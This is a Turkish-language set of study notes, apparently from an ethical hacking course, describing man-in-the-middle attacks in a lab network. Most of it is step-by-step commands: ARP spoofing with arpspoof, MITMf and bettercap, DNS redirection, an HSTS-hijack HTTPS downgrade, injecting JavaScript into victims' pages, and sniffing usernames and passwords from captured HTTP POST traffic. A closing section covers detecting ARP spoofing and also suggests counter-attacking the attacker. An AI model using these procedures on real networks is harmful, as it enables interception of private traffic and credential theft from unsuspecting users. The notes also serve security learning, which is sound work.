	AFTER CONNECT
netdiscover -r 10.0.2.0/24 -> o ağdaki tüm ip adreslerini tarar.

nmap -> Web sitelerinde, Serverlarda, Sistemlerde açık var mı aramak için kullanılır.
nmap 10.0.2.0/24 -> o ağdaki tüm ip adreslerini daha detaylı tarar.




	MAN IN THE MIDDLE (ortadaki adam)
 Hedefin ve Modemin ortasında olmak.
 Bilgi transferi Hacker üzerinden geçerse tüm bilgileri rahatlıkla görebilir ve inceleyebiliriz.

 HEDEF CİHAZ -> request -> HACKER -> request -> ROUTER   -> response -> HACKER -> response -> HEDEF CİHAZ
 WIN 10 vb.  -> istek   -> KORSAN -> istek   -> INTERNET -> cevap    -> KORSAN -> cevap    -> WIN 10 vb.




	ARP ile MITM
 adress resolution protocol -> adres çözümleme protokolü
 ağ içindeki bir cihaz arp kullanarak "mac adresi" ve "ip adresleri"ni eşleştirebilir.


 ARP spoofing (ARP kandırma)
arpspoof -i eth0 -t 10.0.2.4 10.0.2.1 (10.0.2.4'a kendimizi modem gibi göstermeye çalışırız.)
arpspoof -i eth0 -t 10.0.2.1 10.0.2.4 (10.0.2.1'e kendimizi cihaz gibi göstermeye çalışırız.)
 Saldırılan cihazda komut istemcisine "arp -a" yazarız ve adreslerdeki değişiklilik varsa çalışıyor demektir.

 eth0 = arayüz
 wi-fi card ile gerçek bir bilgisayara saldırsaydık eth0 yerine wlan0 yazardık.
 -t   = target/hedef
 10.0.2.4 = Hedefin adresi (netdiscover)
 10.0.2.1 = Modemin adresi 


 ip forward yapmazsak hedef bilgisayar internete giremez.
 modemden aldığımız paketleri hedef cihaza iletmek için ip forwarding'i etkin hale getirmemiz gerekir.
echo 1 > /proc/sys/net/ipv4/ip_forward
 eğer 1 yazıyorsa etkin hale gelmiştir. yazmıyor ise etkin hale gelmemiştir.




	MITM ÇALIŞTIRMAK
cd Downloads/
cd MITMf-master/
python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.10 --target 10.0.2.4
 MITM açıkken hedef bilgisayarda internet üzerinden yapılan her veri akışı hacker'a gönderilir. (username, password vs.)


 -i = interface
 wifi card = wlan0
 --gateway = modem'in adresi (öğrenmek için > terminal > ifconfig)
 --target  = hedef'in adresi (öğrenmek için > CMD      > ipconfig)




	WEB SUNUCUSU
  Domain Name Server Attack
 Kullanıcı hangi siteye girerse girsin açılacak olan benim server'ım olacak
service apache2 start
File System > var > www > html
 Web sitesini değiştirmek  için Open with "Leafpad"
 Web sitesini görüntülemek için Open with "Firefox ESR"




	INDEX'E YÖNLENDİRMEK
cd Downloads/
cd MITMf-master/
python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.10 --target 10.0.2.4 --dns 

 root > Downloads > MITMf-master > config > mitmf.conf > [[[A]]] alt paragraf -> *.atilsamancioglu.com=10.0.2.10
	Hedef bilgisayar eğer "atilsamancioglu.com" adresine girerse onu 10.0.2.10 adresine gönderir.




	BETTERCAP
 bettercap -iface eth0	-> wifi-card = eth0 değil wlan0
net.probe on / net.probe off
 net.probe -> ip adreslerini dürter
 net.recon -> dürtülen ip adreslerinden gelen sonuçları düzenler ve liste halinde gösterir. (netdiscover gibi)
 help net.sniff on -> Ağınıza gelen paketleri toplar ve bize gösteririr.
net.show   -> Tablo halinde gösterir.




	ARP SALDIRISI
arp.spoof on	-> Karşı tarafa arp requestleri (istekleri) yollamaya başlar.
 arp.ban		-> Deauth saldırısının aynısı
set arp.spoof.fullduplex true	-> Eğer bu aktif (true) ise hem hedefe hem de modeme arp spoofing yaparız.
set arp.spoof.targets 10.0.2.4	-> net.show'da gözüken hedef'in ip adresini giriyoruz.
arp.spoof on	-> ARP Saldırımız başladı.

 Bilgileri Ele Geçirmek
net.sniff on	-> Gelen paketleri toplar ve bize gösterir.
		-> Hedef cihazın internette nereye girdiği gösterilir. (username, passwd vs.)


	HTTPS
bettercap -iface eth0
caplets.show	-> Bettercap ile beraber çalıştırabildiğimiz bazı saldırıları gösterir.




	HSTSHIJACK
Siteleri http'ye döndürmek için kullanılır.
cd usr/
cd share/
cd bettercap/
cd caplets/
cd hshtshijack/
leafpad hstshijack.cap	-> Yazarak hstshijack içerisine girebiliriz.




	HTTPS KIRMAK
bettercap -iface eth0
net.probe on
set arp.spoof.fullduplex	-> Eğer bu aktif (true) ise hem hedefe hem de modeme arp spoofing yaparız.
set arp.targets 10.0.2.4	-> net.show'da gözüken hedef'in ip adresini giriyoruz.

	arp.spoof.internal	-> Wifi kartımızı kullanarak gerçek bir cihaza saldırı yapıyorsak bunu true yapmamız gerekir.
				-> set arp.spoof.internal true
arp.spoof on	-> ARP Saldırımız başladı.
net.sniff on	-> Gelen paketleri toplar ve bize gösterir.
		-> Hedef cihazın internette nereye girdiği gösterilir. (username, passwd vs.)
hstshijack/hstshijack	-> Bunu aktif hale getirdik ve bundan sonra https kullanan ve "leafpad htpshijack" kısmına girdiğimiz güvenli siteleri http olarak açacaktır.
	Hedef bilgisayardan açılan https sitelere girilen bilgiler bize aktarılacaktır.




	JAVASCRIPT ÇALIŞTIRMAK
 root/ -> Klasörünün içine bir javascript dosyası oluşturduk. (turgay.js)
 Bu js dosyasının hstshijack ile birlikte çalışması için hstshijack.cap dosyasının içindeki payload kısmının sonuna,
	*:/root/turgay.js	-> Yazdık, böylelikle hstshijack ne zaman çalışırsa bu js dosyası da onunla birlikte çalışacaktır.

bettercap -iface eth0
help
net.probe on
help arp.spoof
set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.2.4
arp.spoof on
help
	Şuandan itibaren oluşturduğumuz js dosyası sebebiyle hedef bilgisayar bir adrese girmeyi denediğinde girilen site hedef bilgisayara 'i hack you' alert'i (uyarısı) verir.





	WIRESHARK
Terminale "wireshark" yazarak giriş yapabilirsiniz.
capture'lardan istediğimizi dinleyebiliriz. (eth0)

 Source: Paketin nereden çıktığını gösterir.
 Destination: Paketin nereye gittiğini gösterir.

  Wireshark'ı Ortadaki Adam Olarak Kullanmak. (Bettercap veya MITMF)
bettercap -iface eth0
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.2.10
arp.spoof on	Bu sefer paketleri Wiresharktan okuyacağımız için net.sniff'i aktif etmemize gerek yok.

Hedef bilgisayar'ın yaptığı her hareket wireshark'a yansır. (username, password vs.)
Arama kısmına http yazıp enter'a basarsak sadece http protokollerini gösterir.

Edit > Find Packet > Display Filter'ı, String olarak; Packet list kısmını, Packet details olarak ayarlamamız gerekiyor.
		   > Eğer bir metin arıyorsak String
Find Packet içerisine "password" diye aratma yapıp: Protocol:HTTP, info:POST olan paketleri incelememiz gerekiyor.
	Kullanıcı işlemleri (username, password vs.) genelde POST Methodu ile yapıldığı için bu paketleri inceleriz.





	ORTADAKİ ADAMDAN KORUNMAK
Windows > CMD > arp -a	Physical Adress -> Modemimizin MAC Adresi ile aynı ip adresine sahip olan başka cihaz mevcut ise saldırı altındayız demektir.
			Internet Adress -> Aynı olan ip'nin internet adress kısmındaki ip adresi bize saldırganın cihazın ip'sini gösterir.
			ve Böylelikle o ip adresine geri saldırılar düzenleyebilir ve onu hackleyebiliriz.

Bilgisayarımıza kurduğumuz Wireshark aracından yapılan bazı ayarlar da ortadaki adamdan korunmamızı sağlar.
	Edit > Preferences > Advanced > search "arp" > arp.detected_request_storms > Value=True yapmamız gerekmektedir.
		Bu yaptığımız ayarı yaparak wireshark'a "Bir arp saldırısı olursa bunu bana bul." diyoruz.

wireshark > eth0 > Adress Resolution Protocol (request) >  Sender MAC adress: -> Hacker'ın ip adresini gösterir.
